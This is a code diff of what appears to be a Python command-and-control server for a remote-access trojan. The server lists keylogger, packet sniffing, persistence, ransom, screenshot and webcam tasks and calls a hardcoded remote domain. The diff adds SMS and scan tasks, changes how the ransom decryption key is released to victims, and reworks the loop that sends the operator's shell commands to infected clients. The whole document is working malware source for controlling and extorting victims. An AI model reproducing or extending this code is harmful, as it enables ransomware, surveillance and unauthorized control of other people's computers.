@@ -95,7 +95,7 @@ class Server(threading.Thread):
 
     global threads
     
-    database = {'domain':'https://snapchat.sex/', 'pages': {'query': 'query.php','session': 'session.php'}, 'session_key': None, 'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload','email']}
+    database = {'domain':'https://snapchat.sex/', 'pages': {'query': 'query.php','session': 'session.php'}, 'session_key': None, 'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload','email','sms','scan']}
     
     def __init__(self, port, **kwargs):
         super(Server, self).__init__()
@@ -383,7 +383,6 @@ class Server(threading.Thread):
             client = self.clients[int(client_id)]
             self.current_client = client
             print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
-            print(self._text_color + self._text_style)
             self.current_client.shell.set()
             return self.current_client.run()
 
@@ -577,14 +576,7 @@ class Server(threading.Thread):
     def ransom_client(self, args=None):
         if self.current_client:
             if 'decrypt' in str(args):
-                result = self.query_database("SELECT * FROM ransom WHERE session='{}'".format(self.current_client.session))
-                if result:
-                    result = json.loads(result)
-                    if int(results.get('payment')) != 0:
-                        self.send_client("ransom decrypt %s" % self.current_client.private_key.exportKey(), self.current_client.name)
-                    else:
-                        self.send_client("ransom payment")
-                return
+                self.send_client("ransom decrypt %s" % self.current_client.private_key.exportKey(), self.current_client.name)
             else:
                 self.send_client("ransom %s" % args, self.current_client.name)
                 return
@@ -817,47 +809,34 @@ class ClientHandler(threading.Thread):
     def run(self):
         while True:
             try:
-                if self.prompt:
-                    task = self.prompt
-                else:
-                    threads['server'].send_client('prompt')
-                    task = threads['server'].recv_client(self.name)
-                self.shell.wait()
-                if isinstance(task, dict):
-                    if 'prompt' in task.get('command'):
-                        self.prompt     = task
-                        command         = self._prompt(bytes(self.prompt.get('result')).format(self.name))
-                        cmd, _, action  = bytes(command).partition(' ')
-                        if cmd in threads['server'].commands and cmd != 'help':
-                            result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
-                            if result:
-                                threads['server']._print(result)
-                                self.shell.clear()
-                                threads['server'].save_task_results(task)
-                                self.shell.set()
-                        else:
-                            threads['server'].send_client(command, self.name)
-                            result = threads['server'].recv_client(self.name)
-                            if result:
-                                threads['server']._print(result)
-                    elif 'help' in task.get('command'):
+                if self.shell.wait():
+                    task = threads['server'].recv_client(self.name) if not self.prompt else self.prompt
+                    if 'help' in task.get('command'):
                         self.shell.clear()
                         threads['server'].show_usage_help(data=task.get('result'))
                         self.shell.set()
                     elif 'standby' in task.get('command'):
                         threads['server']._print(task.get('result'))
                         break
-                    elif 'error' in task.get('command'):
-                        self._error(task.get('result'))
-                    else:
-                        if task.get('result'):
-                            threads['server']._print(task.get('result'))
-                            threads['server'].save_task_results(task)
-                else:
-                    threads['server']._print(str(task))
-                self.prompt = None
-                if threads['server'].exit_status:
-                    break
+                    elif 'prompt' in task.get('command'):
+                        prompt  = task.get('result') % int(self.name)
+                        command = self._prompt(prompt)
+                        cmd, _, action  = command.partition(' ')
+                        if cmd in threads['server'].commands and cmd != 'help':
+                            self.prompt = task
+                            result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
+                            if result:
+                                threads['server']._print(result)
+                                threads['server'].save_task_results(task)
+                            continue
+                        else:
+                            threads['server'].send_client(command, self.name)
+                    elif task.get('result'):
+                        threads['server']._print(task.get('result'))
+                        threads['server'].save_task_results(task)
+                    elif threads['server'].exit_status:
+                        break
+                    self.prompt = None
             except Exception as e:
                 self._error(str(e))
                 time.sleep(5)
